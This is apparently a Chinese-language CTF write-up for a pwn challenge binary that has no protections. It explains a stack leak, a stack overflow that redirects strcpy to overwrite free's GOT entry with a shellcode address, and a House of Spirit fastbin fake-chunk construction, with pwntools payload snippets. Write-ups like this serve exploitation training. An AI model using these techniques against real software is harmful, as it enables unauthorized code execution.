# 入手
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE
```
各种保护都没开

#程序流程

## 1.输入name
```
for(int i=0;i<=47;i++)
    read(0,name,1);
```
但是这个时候栈是<br>
- (low)
- i         
- ret_val
- name_str
- rbp     
- (high)<br>
如果把name_str填满 就能够在printf的时候打印出栈内保持的ebp 然后算出可以使用的栈地址<br>

## 2.输入id 
```
for(int i=0;i<=3;i++)
    read(0, buf_tmp, 1);
```
限制数字0-9 读入后转换为整数<br>
## 3."give me money~"
```
read(0,buf,0x40);
strcpy (buf_mal, buf);
```
buf_mal是malloc申请的(预计是堆溢出)<br>
然后由全局指针(ptr)来指向这个空间<br>
到这里乍一看好像没什么问题<br>
仔细一点就发现有栈溢出，可以覆盖buf_mal地址
```
buf= byte ptr -40h
dest= qword ptr -8
```
这里直接把堆的地址覆盖成got里free的地址<br>
然后strcpy的时候把free的地址改成shellcode的地址

## 4.分支选择

### choice 1:
限制在0,0x80<br>
ptr = malloc(0x80)<br>
ptr 指向输入的money<br>
上面可以看到之前申请的空间没有释放<br>
最后然后输出之前输入的内容<br>
### choice 2:
test ptr是不是0<br>
0 : 直接输出"havn't check in"然后返回<br>
1 : 释放ptr<br>

### choice 3:
直接返回<br>
### 其他
提示不合法<br>

# 突破点
在choice1 和 choice2那里<br>
开始ptr先有0x40的空间<br>

## 方法

## 1.就是利用strcpy修改got表中free的地址到shellcode地址
然后free
```
# 关键1
shellcode + 'A'*(0x30-len(shellcode))
# 关键2
payload = p64(stack_addr) + 'A'*0x30 + p64(free_got)
# 完成
p.recvuntil('choice : ')
p.send('2\n')
```
第一个就是泄露出栈内ebp的值 然后算出name_str的地址<br>
第二个就是把chunk地址覆盖成got表的free地址 然后利用strcpy把这个地址覆盖成刚刚活动的name_str地址(存放shellcode了) 然后调用free<br>

## 2.THE HOUSE OF SPIRIT
studying
需要构造合适的mem<br>
```
p.recvuntil('money~')
fake_chunk = 'A'*0x8
fake_chunk += p64(0x61)
fake_chunk += 'A'*0x28
fake_chunk += p64(stack_addr)
p.send(fake_chunk)
```
这里stack_addr调整到了刚刚好是0x61的后面的位置，所以0x61就作为这个mem的size了<br>
关于next_size 由于之前要求输入id 并且这个id值保存在比stack_addr指向的位置高的地方，所以0x61就是根据这个确定的(0x60+1 1是标志位)<br>
***next_size有约束条件***
```
if(chunk_at_offset(p, size)->size <= 2*SIZE_SZ || \
_builtin_expect(chunksize)(chunk_at_offset(p,size) >= av->system_mem,0))
{
    errstr = "free(): invalid next size fast";
    goto errout;
}
```
2*SIZE_SZ < next_size < system_max_mem
```
p.recvuntil('id ~~?')
p.sendline(str(0x20))
```

这样构造之后进行free就会让刚刚构造的mem加入fastbin中<br>
然后调用malloc就又把刚刚的mem中chunk的地址返回给我们，利用返回的值，然后覆盖到某个rsp，最后跳出循环，就能执行shell了。<br>

# Tips
1. 内存泄漏
2. 堆地址覆盖
3. 栈偏移固定
4. 利用了两个可控的位置作为size+8和next_size构造house of spirit

